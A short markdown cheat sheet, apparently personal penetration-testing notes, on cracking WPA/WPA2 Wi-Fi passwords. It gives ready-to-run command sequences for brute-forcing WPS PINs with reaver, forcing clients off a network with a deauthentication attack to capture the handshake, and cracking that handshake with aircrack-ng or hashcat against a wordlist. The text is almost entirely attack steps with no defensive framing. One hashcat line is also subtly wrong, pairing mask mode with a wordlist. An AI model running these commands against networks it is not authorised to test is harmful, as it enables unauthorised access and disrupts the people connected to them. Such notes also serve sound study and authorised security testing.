---
title: WPA - WPA2 Cracking
---

### Crack WPS Enabled Networks

````bash
wash --interface <interface>
````

**Output**:  
Lck : Shows if WPS is locked (Can be locked after continuous failed attempts)  
dBm : Signal Strength

````bash
aireplay-ng --fakeauth 30 -a <router-bssid> -h <myadapter-bssid> <interface>
reaver --bssid <router-bssid> --channel <channel> --interface <interface> -vvv --no-associate
````

This attack will fail if PBA is enabled. The only way to confirm is by performing the attack

`--no-associate` flag prevents reaver from connecting to the network if the crack was successful (If not set reaver is found to fail in most of the cases)

---

### Crack WPS Disabled Networks

````bash
airodump-ng <interface>
airodump-ng --bssid <router-bssid> --channel <channel> --write <filename> <interface>
aircrack-ng <filename> -w <wordlist>
````

Handshake packet is only transferred when an new device connected to the network.
We can force an device to reconnect using an Deauth Attack

````bash
aireplay-ng --deauth <very-small-number> -a <router-bssid> -c <target-bssid> <interface>
````

If we open the .cap file in Wireshark we can see the "EAPOL (Extensible Authentication Protocol over LAN)" Packet  
i.e. The 4-Way Handshake performed by WPA  
For cracking use of `rockyou.txt` wordlist  
The cracking step can be performed using Hashcat more much faster bruteforcing using GPU

````bash
/usr/share/hashcat-utils/cap2hccapx.bin <cap-file> <filename>.hccapx
hashcat -m 2500 -a 3 -o <output-file> <handshake-file> <wordlist>
````